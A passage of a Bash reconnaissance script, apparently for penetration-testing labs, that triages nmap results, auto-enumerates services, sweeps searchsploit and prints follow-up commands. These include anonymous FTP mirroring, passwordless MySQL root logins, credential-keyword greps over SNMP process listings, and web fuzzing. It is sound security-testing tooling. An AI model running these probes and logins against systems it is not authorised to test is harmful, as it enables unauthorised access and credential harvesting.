    info "${proto^^} enumeration starting: $ip:$port"

    # --- Banner grab ---
    if check_tool nc; then
        info "  → banner grab"
        # shellcheck disable=SC2016
        timeout 10 bash -c 'printf "QUIT\r\n" | nc -w 5 "$1" "$2"' \
            -- "$ip" "$port" > "$outdir/banner_${port}.txt" 2>&1 || true

        local banner
        banner=$(head -1 "$outdir/banner_${port}.txt" 2>/dev/null | tr -d '\r\n')
        [[ -n "$banner" ]] && success "  Banner: $banner"

        # --- CAPABILITIES probe ---
        if [[ "$proto" == "pop3" ]]; then
            info "  → POP3 CAPA"
            # shellcheck disable=SC2016
            timeout 10 bash -c 'printf "CAPA\r\nQUIT\r\n" | nc -w 5 "$1" "$2"' \
                -- "$ip" "$port" > "$outdir/capa_${port}.txt" 2>&1 || true
        else
            info "  → IMAP CAPABILITY"
            # shellcheck disable=SC2016
            timeout 10 bash -c 'printf ". CAPABILITY\r\n. LOGOUT\r\n" | nc -w 5 "$1" "$2"' \
                -- "$ip" "$port" > "$outdir/capability_${port}.txt" 2>&1 || true
        fi
    fi

    # --- Nmap scripts ---
    if [[ "$proto" == "pop3" ]]; then
        info "  → nmap POP3 scripts"
        timeout 60 nmap --script=pop3-capabilities,pop3-ntlm-info \
            -p "$port" -oN "$outdir/nmap_pop3_${port}.txt" "$ip" 2>&1 | tail -3 || true
    else
        info "  → nmap IMAP scripts"
        timeout 60 nmap --script=imap-capabilities,imap-ntlm-info \
            -p "$port" -oN "$outdir/nmap_imap_${port}.txt" "$ip" 2>&1 | tail -3 || true
    fi

    success "${proto^^} enumeration complete for $ip:$port"
    progress_log "$target_dir" "DONE" "$phase_key" ""
}

#------------------------------------------------------------------------------
# PHASE 4: SERVICE TRIAGE — Decide what to enumerate based on nmap results
#------------------------------------------------------------------------------
triage_and_enumerate() {
    local ip="$1"
    local target_dir="$2"
    local nmap_file="$target_dir/scans/nmap_tcp.nmap"

    phase "Service Triage & Auto-Enumeration → $ip"
    # Reset per-target in-process queue tracker (prevents double-launch for
    # services like SMB that appear on multiple ports: 139 and 445).
    QUEUED_PHASES=()

    if [[ ! -f "$nmap_file" ]]; then
        warn "No nmap results found for $ip — cannot triage services"
        return 1
    fi

    # Parse nmap output: extract port/proto/state/service/version lines
    # Format: "22/tcp open ssh OpenSSH 8.2p1 Ubuntu..."
    local services_found=()
    local port="" proto="" state="" service="" version=""
    while IFS= read -r line; do
        port=$(echo "$line" | awk -F'/' '{print $1}')
        proto=$(echo "$line" | awk '{print $1}' | awk -F'/' '{print $2}')
        state=$(echo "$line" | awk '{print $2}')
        service=$(echo "$line" | awk '{print $3}')
        version=$(echo "$line" | awk '{for(i=4;i<=NF;i++) printf "%s ", $i; print ""}' | xargs)

        [[ "$state" != "open" ]] && continue
        [[ -z "$port" ]] && continue

        services_found+=("$port:$service:$version")

        info "Found: $port/$proto → $service $version"

        # --- Decide which enumeration to launch ---
        # HTTP/HTTPS
        if is_http_port "$port" "$service"; then
            launch_enum enum_http "$ip" "$port" "$target_dir" "$service"

        # SMB
        elif [[ "$port" == "139" || "$port" == "445" ]] || [[ "$service" =~ smb|microsoft-ds|netbios ]]; then
            # Only launch once for SMB (139 and 445 are the same service).
            # Check QUEUED_PHASES (in-process) AND is_phase_done (resume) to avoid
            # double-launch race: both ports appear before the async job writes DONE.
            if [[ -z "${QUEUED_PHASES[smb]+x}" ]] && ! is_phase_done "$target_dir" "smb"; then
                QUEUED_PHASES[smb]=1
                launch_enum enum_smb "$ip" "$port" "$target_dir"
            fi

        # FTP
        elif [[ "$service" =~ ftp ]] || [[ "$port" == "21" ]]; then
            launch_enum enum_ftp "$ip" "$port" "$target_dir"

        # SSH
        elif [[ "$service" =~ ssh ]] || [[ "$port" == "22" ]]; then
            launch_enum enum_ssh "$ip" "$port" "$target_dir"

        # SNMP (TCP — rare but possible)
        elif [[ "$service" =~ snmp ]] || [[ "$port" == "161" || "$port" == "162" ]]; then
            launch_enum enum_snmp "$ip" "$port" "$target_dir" "false"

        # MySQL
        elif [[ "$service" =~ mysql ]] || [[ "$port" == "3306" ]]; then
            launch_enum enum_mysql "$ip" "$port" "$target_dir"

        # MSSQL
        elif [[ "$service" =~ ms-sql|mssql ]] || [[ "$port" == "1433" ]]; then
            launch_enum enum_mssql "$ip" "$port" "$target_dir"

        # PostgreSQL
        elif [[ "$service" =~ postgres ]] || [[ "$port" == "5432" ]]; then
            launch_enum enum_postgres "$ip" "$port" "$target_dir"

        # DNS
        elif [[ "$service" =~ domain|dns ]] || [[ "$port" == "53" ]]; then
            launch_enum enum_dns "$ip" "$port" "$target_dir"

        # SMTP
        elif [[ "$service" =~ smtp ]] || [[ "$port" == "25" || "$port" == "587" || "$port" == "465" ]]; then
            launch_enum enum_smtp "$ip" "$port" "$target_dir"

        # RPC / NFS
        elif [[ "$service" =~ rpcbind|nfs|msrpc ]] || [[ "$port" == "111" || "$port" == "2049" ]]; then
            if [[ -z "${QUEUED_PHASES[rpc]+x}" ]] && ! is_phase_done "$target_dir" "rpc"; then
                QUEUED_PHASES[rpc]=1
                launch_enum enum_rpc "$ip" "$port" "$target_dir"
            fi

        # LDAP
        elif [[ "$service" =~ ldap ]] || [[ "$port" == "389" || "$port" == "636" || "$port" == "3268" ]]; then
            if [[ -z "${QUEUED_PHASES[ldap]+x}" ]] && ! is_phase_done "$target_dir" "ldap"; then
                QUEUED_PHASES[ldap]=1
                launch_enum enum_ldap "$ip" "$port" "$target_dir"
            fi

        # Redis
        elif [[ "$service" =~ redis ]] || [[ "$port" == "6379" ]]; then
            launch_enum enum_redis "$ip" "$port" "$target_dir"

        # POP3
        elif [[ "$service" =~ pop3 ]] || [[ "$port" == "110" || "$port" == "995" ]]; then
            launch_enum enum_pop3_imap "$ip" "$port" "$target_dir" "pop3"

        # IMAP
        elif [[ "$service" =~ imap ]] || [[ "$port" == "143" || "$port" == "993" ]]; then
            launch_enum enum_pop3_imap "$ip" "$port" "$target_dir" "imap"

        # Unknown/other — log it (KB-driven hint is emitted later in generate_quick_wins)
        else
            info "  (no auto-enum module for $service on port $port — manual follow-up)"
        fi

    done < <(grep -P '^\d+/(tcp|udp)\s+open\s' "$nmap_file" 2>/dev/null)

    # --- Also check UDP results for SNMP ---
    local udp_file="$target_dir/scans/nmap_udp.nmap"
    if [[ -f "$udp_file" ]]; then
        if grep -qP '161/udp\s+open' "$udp_file" 2>/dev/null; then
            if [[ -z "${QUEUED_PHASES[snmp]+x}" ]] && ! is_phase_done "$target_dir" "snmp"; then
                QUEUED_PHASES[snmp]=1
                success "SNMP found on UDP 161 — launching enumeration"
                launch_enum enum_snmp "$ip" "161" "$target_dir" "true"
            fi
        fi
    fi

    if (( ${#services_found[@]} == 0 )); then
        warn "No services to enumerate for $ip"
    else
        info "Launched enumeration for ${#services_found[@]} service(s) on $ip"
    fi
}

#------------------------------------------------------------------------------
# SEARCHSPLOIT XML SWEEP
# Runs `searchsploit -j --nmap nmap_tcp.xml` and writes a deduped, OffSec-relevant
# hit list to loot/searchsploit_hits.txt. Returns the path on success.
#------------------------------------------------------------------------------
run_searchsploit_xml() {
    local target_dir="$1"
    local xml="$target_dir/scans/nmap_tcp.xml"
    local out="$target_dir/loot/searchsploit_hits.txt"
    [[ -s "$xml" ]] || return 1
    command -v searchsploit &>/dev/null || return 1
    mkdir -p "$target_dir/loot"

    local json_tmp
    json_tmp=$(mktemp) || return 1
    timeout 60 searchsploit -j --nmap "$xml" > "$json_tmp" 2>/dev/null || true

    # searchsploit --nmap emits one JSON object per search term, interleaved
    # with [i]/[-] log lines. Stream-decode each JSON object and filter for
    # signal: keep only version-targeted searches (SEARCH term contains a
    # digit, e.g. "openssh 7.4"), drop bare-product noise ("openssh"), dedupe
    # by first CVE, and drop CVE-less DoS entries.
    python3 - "$json_tmp" "$out" <<'PY' 2>/dev/null || { rm -f "$json_tmp"; return 1; }
import json, re, sys
raw = open(sys.argv[1]).read()
dec = json.JSONDecoder()
hits = []
i = 0
while i < len(raw):
    j = raw.find("{", i)
    if j == -1:
        break
    try:
        obj, end = dec.raw_decode(raw, j)
    except ValueError:
        i = j + 1
        continue
    i = end
    search = str(obj.get("SEARCH", "")).strip()
    # Version-targeted queries only — bare-product queries are too noisy
    # (e.g. "openssh" returns ~28 hits spanning 2001-2024).
    if not re.search(r'\d', search):
        continue
    for h in obj.get("RESULTS_EXPLOIT", []) or []:
        hits.append(h)

seen_edb = set()
seen_cve = set()
rows = []
for h in hits:
    eid = h.get("EDB-ID") or ""
    if not eid or eid in seen_edb:
        continue
    seen_edb.add(eid)
    title = h.get("Title", "").strip()
    ptype = (h.get("Type") or "").lower()
    platform = (h.get("Platform") or "").lower()
    codes = h.get("Codes") or "-"
    if ptype == "dos" and "CVE-" not in codes:
        continue
    # Dedupe by first CVE — many EDBs share one CVE (e.g. CVE-2018-15473)
    cves = re.findall(r'CVE-\d{4}-\d+', codes)
    if cves:
        first = cves[0]
        if first in seen_cve:
            continue
        seen_cve.add(first)
    rows.append(f"[EDB-{eid}] {title}  ({codes})  [{ptype}/{platform}]")
with open(sys.argv[2], "w") as f:
    f.write("\n".join(rows))
    if rows:
        f.write("\n")
PY
    rm -f "$json_tmp"
    [[ -s "$out" ]] && echo "$out"
    return 0
}

#------------------------------------------------------------------------------
# FINDING-DRIVEN NEXT STEPS
# Writes concise commands only when backed by nmap detections or non-empty result
# files produced by this script.
#------------------------------------------------------------------------------
generate_quick_wins() {
    local ip="$1"
    local target_dir="$2"
    local qw_file="$target_dir/loot/quick_wins.txt"
    local tmp_file="${qw_file}.tmp"
    mkdir -p "$target_dir/loot"
    : > "$tmp_file"

    # --- Parse vulners NSE output from nmap (CVSS >= 7.0 or *EXPLOIT*) ---
    # Emits one line per service: "VULNERS port/service → TOP: CVE-X (9.8), CVE-Y (8.1) ..."
    # Full dump also written to loot/vulners_hits.txt for drill-down.
    local nmap_tcp="$target_dir/scans/nmap_tcp.nmap"
    if is_nonempty_file "$nmap_tcp"; then
        local vulners_dump="$target_dir/loot/vulners_hits.txt"
        awk '
            /^[0-9]+\/tcp\s+open/ {
                split($1, a, "/"); curport = a[1]; cursvc = $3;
                invuln = 0; next
            }
            /^\|[ _]*vulners:/      { invuln = 1; next }
            /^\|[ _]*[a-zA-Z]+:/    { invuln = 0 }
            invuln && /CVE-|EXPLOIT|[0-9A-F]{8}-[0-9A-F]{4}/ {
                line = $0
                gsub(/^\|[ _]+/, "", line)
                gsub(/\s+/, " ", line)
                # Field layout: ID  CVSS  URL  [*EXPLOIT*]
                n = split(line, f, " ")
                if (n < 2) next
                cvss = f[2] + 0
                exploit = (line ~ /\*EXPLOIT\*/)
                if (cvss >= 7.0 || exploit) {
                    tag = (exploit ? "*" : "")
                    printf "%s\t%s/%s\t%s (%.1f)%s\n", ip, curport, cursvc, f[1], cvss, tag
                }
            }
        ' ip="$ip" "$nmap_tcp" | sort -u > "$vulners_dump" 2>/dev/null || true

        if is_nonempty_file "$vulners_dump"; then
            # Summarize: top-5 per service by CVSS (desc), dedupe by CVE id preferred
            awk -F'\t' '
                { svc[$2] = svc[$2] ? svc[$2] "," $3 : $3 }
                END { for (s in svc) print s "\t" svc[s] }
            ' "$vulners_dump" | while IFS=$'\t' read -r svc hits; do
                # Prefer CVE-* entries first, cap to 5
                local top
                top=$(echo "$hits" | tr ',' '\n' | awk '/CVE-/ {print}' | head -5 | paste -sd', ' -)
                [[ -z "$top" ]] && top=$(echo "$hits" | tr ',' '\n' | head -3 | paste -sd', ' -)
                quick_win_to "$target_dir" "$tmp_file" \
                    "VULNERS on $ip:$svc → ${top} (full list: $vulners_dump)" \
                    "nmap -sV --script=vulners -p ${svc%/*} $ip  # parsed from $nmap_tcp"
            done
        fi
    fi

    local vrfy_file="$target_dir/tcp/smtp/vrfy_users.txt"
    if is_nonempty_file "$vrfy_file" && grep -q '^VALID:' "$vrfy_file" 2>/dev/null; then
        local smtp_users_loot="$target_dir/loot/smtp_valid_users.txt"
        grep -oP '^VALID:\s*\K\S+' "$vrfy_file" 2>/dev/null | sort -u > "$smtp_users_loot" || true
        if is_nonempty_file "$smtp_users_loot"; then
            local smtp_ucount
            smtp_ucount=$(wc -l < "$smtp_users_loot" 2>/dev/null); smtp_ucount=${smtp_ucount:-0}
            quick_win_to "$target_dir" "$tmp_file" \
                "SMTP VRFY valid usernames: ${smtp_ucount} saved to ${smtp_users_loot}" \
                "grep -oP '^VALID:\\s*\\K\\S+' $vrfy_file | sort -u > $smtp_users_loot"
        fi
    fi

    if grep -qiE 'READ|WRITE' "$target_dir/tcp/smb/smbmap_null.txt" "$target_dir/tcp/smb/smbmap_guest.txt" 2>/dev/null; then
        quick_win_to "$target_dir" "$tmp_file" \
            "SMB readable share via null/guest session — see $target_dir/tcp/smb/smb_quick_findings.txt" \
            "smbmap -H $ip; smbmap -H $ip -u guest -p ''"
    fi

    if is_nonempty_file "$target_dir/tcp/ftp/ANONYMOUS_ACCESS.txt"; then
        quick_win_to "$target_dir" "$tmp_file" \
            "Anonymous FTP login succeeded on $ip — mirrored files under $target_dir/tcp/ftp/mirror/" \
            "wget -r -l 3 --no-passive-ftp ftp://anonymous:anon@${ip}/ -P $target_dir/tcp/ftp/mirror/"
    fi

    if is_nonempty_file "$target_dir/udp/snmp/valid_community_strings.txt"; then
        local community_count
        community_count=$(wc -l < "$target_dir/udp/snmp/valid_community_strings.txt" 2>/dev/null); community_count=${community_count:-0}
        quick_win_to "$target_dir" "$tmp_file" \
            "SNMP community string found (${community_count}) — see $target_dir/udp/snmp/valid_community_strings.txt" \
            "onesixtyone -c <community-list> $ip"
    fi

    if is_nonempty_file "$target_dir/udp/snmp/process_args.txt" && \
       grep -qiE 'pass|pwd|secret|key|token|cred|-p[[:space:]]' "$target_dir/udp/snmp/process_args.txt" 2>/dev/null; then
        quick_win_to "$target_dir" "$tmp_file" \
            "SNMP process arguments contain credential keywords — see $target_dir/udp/snmp/process_args.txt" \
            "snmpwalk -v2c -c <community> $ip 1.3.6.1.2.1.25.4.2.1.5"
    fi

    if is_nonempty_file "$target_dir/udp/snmp/windows_users.txt"; then
        local snmp_users_loot="$target_dir/loot/snmp_windows_users.txt"
        grep -oP 'STRING:\s*"?\K[^"]+' "$target_dir/udp/snmp/windows_users.txt" 2>/dev/null | sort -u > "$snmp_users_loot" || true
        if is_nonempty_file "$snmp_users_loot"; then
            local snmp_ucount
            snmp_ucount=$(wc -l < "$snmp_users_loot" 2>/dev/null); snmp_ucount=${snmp_ucount:-0}
            quick_win_to "$target_dir" "$tmp_file" \
                "Windows usernames exposed via SNMP: ${snmp_ucount} saved to ${snmp_users_loot}" \
                "snmpwalk -v2c -c <community> $ip 1.3.6.1.4.1.77.1.2.25"
        fi
    fi

    local zt_file
    zt_file=$(find "$target_dir/tcp/dns" -name 'zone_transfer_*.txt' -type f 2>/dev/null | head -1)
    if is_nonempty_file "$zt_file" && grep -q 'XFR size' "$zt_file" 2>/dev/null; then
        local zt_domain
        zt_domain=$(basename "$zt_file" | sed 's/^zone_transfer_//;s/\.txt$//')
        quick_win_to "$target_dir" "$tmp_file" \
            "DNS zone transfer succeeded — see $zt_file" \
            "dig @$ip $zt_domain axfr"
    fi

    if is_nonempty_file "$target_dir/tcp/ldap/ldap_full_dump.txt"; then
        local ldap_entries
        ldap_entries=$(grep -c '^dn:' "$target_dir/tcp/ldap/ldap_full_dump.txt" 2>/dev/null); ldap_entries=${ldap_entries:-0}
        if (( ldap_entries > 0 )); then
            quick_win_to "$target_dir" "$tmp_file" \
                "LDAP anonymous bind returned ${ldap_entries} entries — see $target_dir/tcp/ldap/ldap_full_dump.txt" \
                "ldapsearch -x -H ldap://$ip -b <BASE_DN>  # see $target_dir/tcp/ldap/naming_contexts.txt"
        fi
    fi

    if grep -qi 'empty password' "$target_dir/tcp/mysql/nmap_mysql_scripts.txt" 2>/dev/null; then
        quick_win_to "$target_dir" "$tmp_file" \
            "MySQL empty password reported by nmap scripts on $ip" \
            "nmap --script=mysql-info,mysql-enum,mysql-empty-password -p 3306 $ip"
    fi
    if is_nonempty_file "$target_dir/tcp/mysql/root_nopass.txt" && \
       ! grep -qi 'ERROR\|denied\|refused' "$target_dir/tcp/mysql/root_nopass.txt" 2>/dev/null; then
        quick_win_to "$target_dir" "$tmp_file" \
            "MySQL root no-password login succeeded on $ip — see $target_dir/tcp/mysql/root_nopass.txt" \
            "mysql -h $ip -u root --password='' -e 'SHOW DATABASES;'"
    fi

    local pg_login
    pg_login=$(find "$target_dir/tcp/postgres" -maxdepth 1 -name 'login_*.txt' -type f 2>/dev/null | while IFS= read -r f; do
        if is_nonempty_file "$f" && ! grep -qi 'FATAL\|refused\|denied\|error' "$f" 2>/dev/null; then
            basename "$f" | sed 's/^login_//;s/\.txt$//;s/_/:/'
            break
        fi
    done)
    if [[ -n "$pg_login" ]]; then
        pg_login="${pg_login/:empty/:<empty>}"
        local _pg_user="${pg_login%%:*}" _pg_pass="${pg_login#*:}"
        [[ "$_pg_pass" == "<empty>" ]] && _pg_pass=""
        quick_win_to "$target_dir" "$tmp_file" \
            "PostgreSQL LOGIN: ${pg_login} on $ip — see $target_dir/tcp/postgres/" \
            "PGPASSWORD='${_pg_pass}' psql -h $ip -U ${_pg_user} -c 'SELECT version();'"
    fi

    if is_nonempty_file "$target_dir/tcp/redis/info_noauth.txt" && \
       grep -qi 'redis_version' "$target_dir/tcp/redis/info_noauth.txt" 2>/dev/null; then
        quick_win_to "$target_dir" "$tmp_file" \
            "REDIS NO-AUTH on $ip — see $target_dir/tcp/redis/info_noauth.txt" \
            "printf 'INFO\\r\\nQUIT\\r\\n' | nc -w 5 $ip 6379"
    fi

    if grep -qP '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null; then
        quick_win_to "$target_dir" "$tmp_file" \
            "NFS exports found on $ip — see $target_dir/tcp/rpc/nfs_exports.txt" \
            "showmount -e $ip"
    fi

    local httpdir
    for httpdir in "$target_dir/tcp/http"/port_*; do
        [[ -d "$httpdir" ]] || continue
        local p
        p=$(basename "$httpdir" | sed 's/port_//')
        local _proto_p="http"; case "$p" in 443|8443|4443|9443) _proto_p="https" ;; esac
        if is_nonempty_file "$httpdir/http_methods.txt" && \
           grep -qiE 'Allow:.*(TRACE|PUT|DELETE|CONNECT|PROPFIND)|Public:.*(TRACE|PUT|DELETE|CONNECT|PROPFIND)' "$httpdir/http_methods.txt" 2>/dev/null; then
            quick_win_to "$target_dir" "$tmp_file" \
                "Risky HTTP method on $ip:$p — see $httpdir/http_methods.txt" \
                "curl -skIX OPTIONS ${_proto_p}://$ip:$p/"
        fi
        if is_nonempty_file "$httpdir/tls_names.txt"; then
            local tls_first
            tls_first=$(head -1 "$httpdir/tls_names.txt" 2>/dev/null)
            quick_win_to "$target_dir" "$tmp_file" \
                "TLS certificate names found on $ip:$p (first: ${tls_first}) — see $httpdir/tls_names.txt" \
                "echo | openssl s_client -connect $ip:$p -servername $ip 2>/dev/null | openssl x509 -noout -ext subjectAltName"
        fi
        if is_nonempty_file "$httpdir/ffuf_vhosts.json"; then
            local vhost_count
            if command -v jq &>/dev/null; then
                vhost_count=$(jq '.results | length' "$httpdir/ffuf_vhosts.json" 2>/dev/null || echo 0)
            else
                vhost_count=$(grep -c '"url"' "$httpdir/ffuf_vhosts.json" 2>/dev/null); vhost_count=${vhost_count:-0}
            fi
            if (( vhost_count > 0 )); then
                quick_win_to "$target_dir" "$tmp_file" \
                    "Vhosts discovered on $ip:$p (${vhost_count}) — see $httpdir/ffuf_vhosts.json" \
                    "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u ${_proto_p}://$ip:$p/ -H 'Host: FUZZ.$ip'"
            fi
        fi

        # --- CMS / framework fingerprint from WhatWeb ---
        # Strategy (most-specific → least-specific):
        #   1. Named product (WordPress, Exhibitor, Jenkins, ...).
        #   2. Known app hinted by RedirectLocation path (/exhibitor/, /phpmyadmin/, ...).
        #   3. Versioned web server (Jetty(1.0), nginx/1.14.2, Apache/2.4.29).
        # Generic HTTP titles ("Error 404 Not Found", "301 Moved Permanently",
        # "Welcome to nginx") are never used — they produced noise stanzas with
        # junk searchsploit queries.
        if is_nonempty_file "$httpdir/whatweb.txt"; then
            local cms_product="" cms_server="" cms_hit=""
            # Case-insensitive match returns text as it appears in the file
            # (which may be lowercase from a URL path like /exhibitor/). Normalize
            # to canonical case via a lookup table so output reads cleanly.
            cms_product=$(grep -oiE '(Mezzanine|WordPress|Joomla|Drupal|Jenkins|GitLab|Grafana|phpMyAdmin|Tomcat|Nagios|Zabbix|OctoberCMS|Magento|Bolt|Ghost|Strapi|ColdFusion|osTicket|RoundCube|SquirrelMail|SolarWinds|ManageEngine|rConfig|LibreNMS|Cacti|WebMin|Webmin|pfSense|Zimbra|Kibana|Elasticsearch|SonarQube|Artifactory|Bitbucket|Gitea|Gogs|Moodle|Mantis|BugZilla|Redmine|Confluence|Jira|SharePoint|Exchange|Citrix|FortiGate|Exhibitor|ZooKeeper|Consul|Vault|Rancher|Airflow|Kong|Traefik|Prometheus|Alertmanager|Portainer|Rundeck|Couchbase|Splunk|RabbitMQ|Keycloak|OpenCart|PrestaShop|DokuWiki|MediaWiki|Nextcloud|ownCloud|Adminer)' \
                "$httpdir/whatweb.txt" 2>/dev/null | head -1)
            if [[ -n "$cms_product" ]]; then
                cms_product=$(awk -v n="$cms_product" 'BEGIN{
                    map["mezzanine"]="Mezzanine"; map["wordpress"]="WordPress"; map["joomla"]="Joomla";
                    map["drupal"]="Drupal"; map["jenkins"]="Jenkins"; map["gitlab"]="GitLab";
                    map["grafana"]="Grafana"; map["phpmyadmin"]="phpMyAdmin"; map["tomcat"]="Tomcat";
                    map["nagios"]="Nagios"; map["zabbix"]="Zabbix"; map["octobercms"]="OctoberCMS";
                    map["magento"]="Magento"; map["bolt"]="Bolt"; map["ghost"]="Ghost";
                    map["strapi"]="Strapi"; map["coldfusion"]="ColdFusion"; map["osticket"]="osTicket";
                    map["roundcube"]="RoundCube"; map["squirrelmail"]="SquirrelMail"; map["solarwinds"]="SolarWinds";
                    map["manageengine"]="ManageEngine"; map["rconfig"]="rConfig"; map["librenms"]="LibreNMS";
                    map["cacti"]="Cacti"; map["webmin"]="Webmin"; map["pfsense"]="pfSense";
                    map["zimbra"]="Zimbra"; map["kibana"]="Kibana"; map["elasticsearch"]="Elasticsearch";
                    map["sonarqube"]="SonarQube"; map["artifactory"]="Artifactory"; map["bitbucket"]="Bitbucket";
                    map["gitea"]="Gitea"; map["gogs"]="Gogs"; map["moodle"]="Moodle";
                    map["mantis"]="Mantis"; map["bugzilla"]="BugZilla"; map["redmine"]="Redmine";
                    map["confluence"]="Confluence"; map["jira"]="Jira"; map["sharepoint"]="SharePoint";
                    map["exchange"]="Exchange"; map["citrix"]="Citrix"; map["fortigate"]="FortiGate";
                    map["exhibitor"]="Exhibitor"; map["zookeeper"]="ZooKeeper"; map["consul"]="Consul";
                    map["vault"]="Vault"; map["rancher"]="Rancher"; map["airflow"]="Airflow";
                    map["kong"]="Kong"; map["traefik"]="Traefik"; map["prometheus"]="Prometheus";
                    map["alertmanager"]="Alertmanager"; map["portainer"]="Portainer"; map["rundeck"]="Rundeck";
                    map["couchbase"]="Couchbase"; map["splunk"]="Splunk"; map["rabbitmq"]="RabbitMQ";
                    map["keycloak"]="Keycloak"; map["opencart"]="OpenCart"; map["prestashop"]="PrestaShop";
                    map["dokuwiki"]="DokuWiki"; map["mediawiki"]="MediaWiki"; map["nextcloud"]="Nextcloud";
                    map["owncloud"]="ownCloud"; map["adminer"]="Adminer";
                    k=tolower(n); print (k in map) ? map[k] : n
                }')
            fi
            cms_server=$(grep -oiE 'Jetty\([0-9][0-9.]*\)|nginx/[0-9][0-9.]*|Apache/[0-9][0-9.]*|lighttpd/[0-9][0-9.]*|IIS/[0-9][0-9.]*' \
                "$httpdir/whatweb.txt" 2>/dev/null | sort -u | head -1 | tr '/()' '   ' | awk '{$1=$1};1')
            if [[ -n "$cms_product" && -n "$cms_server" ]]; then
                cms_hit="${cms_product} (${cms_server})"
            elif [[ -n "$cms_product" ]]; then
                cms_hit="${cms_product}"
            elif [[ -n "$cms_server" ]]; then
                cms_hit="${cms_server}"
            fi
            if [[ -n "$cms_hit" ]]; then
                quick_win_to "$target_dir" "$tmp_file" \
                    "CMS/app fingerprint on $ip:$p → ${cms_hit} — see $httpdir/whatweb.txt" \
                    "whatweb ${_proto_p}://$ip:$p/"
            fi
        fi

        # --- JSON API endpoint signal (salt-api, Django REST, Flask, etc.) ---
        if is_nonempty_file "$httpdir/curl_headers.txt" && \
           grep -qiE 'Content-Type:\s*application/json|x-upstream:|access-control-allow-credentials' \
               "$httpdir/curl_headers.txt" 2>/dev/null; then
            quick_win_to "$target_dir" "$tmp_file" \
                "JSON API endpoint on $ip:$p — see $httpdir/curl_headers.txt" \
                "curl -skIL ${_proto_p}://$ip:$p/"
        fi

        # --- Nikto surfacing ---
        # Surface only high-signal markers; ignore routine header-hardening notices.
        if is_nonempty_file "$httpdir/nikto.txt"; then
            local nikto_hits
            nikto_hits=$(grep -ciE 'CVE-[0-9]+|OSVDB|/cgi-bin/|/admin|/login|/phpmyadmin|/manager|/console|/\.git|/backup|/config|default account|no authentication|directory indexing|phpinfo|Shellshock|ASP\.NET debug' \
                "$httpdir/nikto.txt" 2>/dev/null); nikto_hits=${nikto_hits:-0}
            if (( nikto_hits > 0 )); then
                quick_win_to "$target_dir" "$tmp_file" \
                    "NIKTO on $ip:$p → ${nikto_hits} interesting finding(s) — see $httpdir/nikto.txt" \
                    "nikto -h ${_proto_p}://$ip:$p/ -Format txt -o $httpdir/nikto"
            fi
        fi

        # --- Feroxbuster surfacing ---
        # Ferox row format: "STATUS GET LINES WORDS BYTES URL". Count 200/301/302
        # results and surface interesting paths.
        if is_nonempty_file "$httpdir/feroxbuster.txt"; then
            local ferox_hits
            ferox_hits=$(grep -cE '^\s*(200|301|302|401|403)\s+(GET|HEAD)\s' "$httpdir/feroxbuster.txt" 2>/dev/null)
            ferox_hits=${ferox_hits:-0}
            if (( ferox_hits > 0 )); then
                local ferox_interesting
                ferox_interesting=$(grep -ciE '/admin|/login|/upload|/config|/backup|/shell|/api|/console|/phpmyadmin|/wp-|/cgi|/manager|/\.git|/\.env' \
                    "$httpdir/feroxbuster.txt" 2>/dev/null); ferox_interesting=${ferox_interesting:-0}
                local _ferox_cmd="feroxbuster -u ${_proto_p}://$ip:$p/ -w $GOBUSTER_WORDLIST -t 30 --timeout 30 -d 2 -q --no-state --filter-status 404,500,502,503 -o $httpdir/feroxbuster.txt"
                if (( ferox_interesting > 0 )); then
                    quick_win_to "$target_dir" "$tmp_file" \
                        "FEROX on $ip:$p → ${ferox_hits} path(s), ${ferox_interesting} interesting — see $httpdir/feroxbuster.txt" \
                        "$_ferox_cmd"
                else
                    quick_win_to "$target_dir" "$tmp_file" \
                        "FEROX on $ip:$p → ${ferox_hits} path(s) — see $httpdir/feroxbuster.txt" \
                        "$_ferox_cmd"
                fi
            fi
        fi
    done

    # --- Searchsploit sweep of nmap XML (version-targeted exploit catalog) ---
    local sxml_hits
    sxml_hits=$(run_searchsploit_xml "$target_dir" 2>/dev/null || true)
    if is_nonempty_file "$sxml_hits"; then
        local sxml_count
        sxml_count=$(wc -l < "$sxml_hits" 2>/dev/null); sxml_count=${sxml_count:-0}
        if (( sxml_count > 0 )); then
            local sxml_top
            sxml_top=$(head -3 "$sxml_hits" 2>/dev/null | paste -sd' | ' -)
            quick_win_to "$target_dir" "$tmp_file" \
                "SEARCHSPLOIT on $ip → ${sxml_count} catalog hit(s); top: ${sxml_top} — see $sxml_hits" \
                "searchsploit -j --nmap $target_dir/scans/nmap_tcp.xml"
        fi
    fi

    if is_nonempty_file "$target_dir/tcp/ssh/version_info.txt"; then
        local ssh_version
        ssh_version=$(head -1 "$target_dir/tcp/ssh/version_info.txt" 2>/dev/null | sed 's/^SSH Version: //')
        if echo "$ssh_version" | grep -qiE 'OpenSSH_[1-6]\.|OpenSSH_7\.[0-9]([^0-9]|$)|dropbear'; then
            quick_win_to "$target_dir" "$tmp_file" \
                "POTENTIALLY VULNERABLE SSH: ${ssh_version} on $ip — see $target_dir/tcp/ssh/version_info.txt" \
                "grep -E 'OpenSSH|dropbear' $target_dir/tcp/ssh/version_info.txt  # banner: $ssh_version"
        fi
    fi

    # Absorb any inline quick_win writes emitted by enum_* phases so that
    # downstream generate_next_steps greps (MS17-010, MSSQL LOGIN, etc.)
    # still see them after the dedup pass.
    if [[ -s "$qw_file" ]]; then
        cat "$qw_file" >> "$tmp_file"
    fi
    if [[ -s "$tmp_file" ]]; then
        sort -u "$tmp_file" > "$qw_file"
    else
        : > "$qw_file"
    fi
    rm -f "$tmp_file"
}

generate_next_steps() {
    local ip="$1"
    local target_dir="$2"
    local next_file="$target_dir/loot/next_steps.txt"
    mkdir -p "$target_dir/loot"

    {
        echo "# Finding-Driven Next Steps — $ip"
        echo "# Generated: $(date)"
        echo "# Commands below are emitted only from concrete findings in this target directory."
        echo ""
    } > "$next_file"

    local vrfy_file="$target_dir/tcp/smtp/vrfy_users.txt"
    if is_nonempty_file "$vrfy_file" && grep -q '^VALID:' "$vrfy_file" 2>/dev/null; then
        local smtp_users_loot="$target_dir/loot/smtp_valid_users.txt"
        grep -oP '^VALID:\s*\K\S+' "$vrfy_file" 2>/dev/null | sort -u > "$smtp_users_loot" || true
        if is_nonempty_file "$smtp_users_loot"; then
            local smtp_ucount
            smtp_ucount=$(wc -l < "$smtp_users_loot" 2>/dev/null); smtp_ucount=${smtp_ucount:-0}
            append_next_finding "$next_file" \
                "SMTP valid users found" \
                "${smtp_ucount} usernames in ${smtp_users_loot}" \
